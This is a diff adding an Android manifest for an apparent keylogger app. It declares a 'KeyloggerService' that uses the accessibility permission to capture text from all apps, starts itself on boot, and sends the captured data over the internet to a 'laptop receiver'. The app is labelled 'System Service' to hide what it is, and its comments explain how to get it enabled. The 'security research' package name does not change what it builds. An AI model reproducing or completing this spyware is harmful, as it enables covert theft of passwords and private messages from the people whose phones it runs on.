@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    AndroidManifest.xml
+    ====================
+    The critical parts:
+    1. BIND_ACCESSIBILITY_SERVICE permission — lets us hook all app text events
+    2. RECEIVE_BOOT_COMPLETED — auto-starts after phone reboot
+    3. INTERNET — needed to send data to laptop receiver
+    4. The accessibility service declaration with the config XML
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.security.research.phonemonitor"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk
+        android:minSdkVersion="26"
+        android:targetSdkVersion="34" />
+
+    <!-- Core permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <permission
+        android:name="com.security.research.phonemonitor.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:protectionLevel="signature" />
+
+    <uses-permission android:name="com.security.research.phonemonitor.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+
+    <application
+        android:allowBackup="false"
+        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+        android:debuggable="true"
+        android:extractNativeLibs="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="System Service"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.PhoneMonitor" >
+
+        <!-- Minimal activity — just shows "Service Running" -->
+        <activity
+            android:name="com.security.research.phonemonitor.MainActivity"
+            android:exported="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--
+            THE CORE: Accessibility Service declaration
+            This is what gives us access to all app text events.
+            User must manually enable it in:
+            Settings → Accessibility → Downloaded Apps → System Service → Enable
+        -->
+        <service
+            android:name="com.security.research.phonemonitor.KeyloggerService"
+            android:exported="true"
+            android:label="System Service"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <!-- Points to res/xml/accessibility_service_config.xml -->
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <!-- Auto-start on boot -->
+        <receiver
+            android:name="com.security.research.phonemonitor.BootReceiver"
+            android:exported="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="com.security.research.phonemonitor.androidx-startup"
+            android:exported="false" >
+            <meta-data
+                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+                android:value="androidx.startup" />
+            <meta-data
+                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+                android:value="androidx.startup" />
+        </provider>
+    </application>
+
+</manifest>
